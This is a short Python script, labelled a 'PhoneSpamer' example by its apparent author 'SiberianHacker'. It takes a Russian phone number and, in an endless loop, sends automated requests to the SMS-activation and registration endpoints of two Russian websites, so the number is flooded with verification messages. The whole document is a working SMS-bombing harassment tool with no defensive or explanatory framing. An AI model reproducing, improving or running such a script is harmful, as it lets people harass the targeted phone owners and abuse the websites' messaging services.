#PhoneSpamer example by SiberianHacker
import requests

phone = '+7'+input('+7')
print("press ctrl + x for stop.")
def send_requests(number):
    try:
        req = requests.post("https://www.ufamama.ru/Auth/ActivationByPhoneForm?phone=" + number)
    except:
        print("Сервис 1 не рабочий :(")
    else:
        print("Отправлено...")
    try:
        requests.post("https://next2u.ru/user/registration?dataType=json")
        req = requests.post("https://next2u.ru/",json={"emailorphone":number, "name":"Алег", "recommend":["false"]}, headers={'Content-Type':"application/x-www-form-urlencoded", "User-Agent":"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36", "x-requested-with":"XMLHttpRequest", "Accept":"application/json"})
    except:
        print("Сервис 2 не рабочий :(")
    else:
        print("Отправлено...")

while True:
    try:
        send_requests(phone)
    except KeyboardInterrupt:
        exit()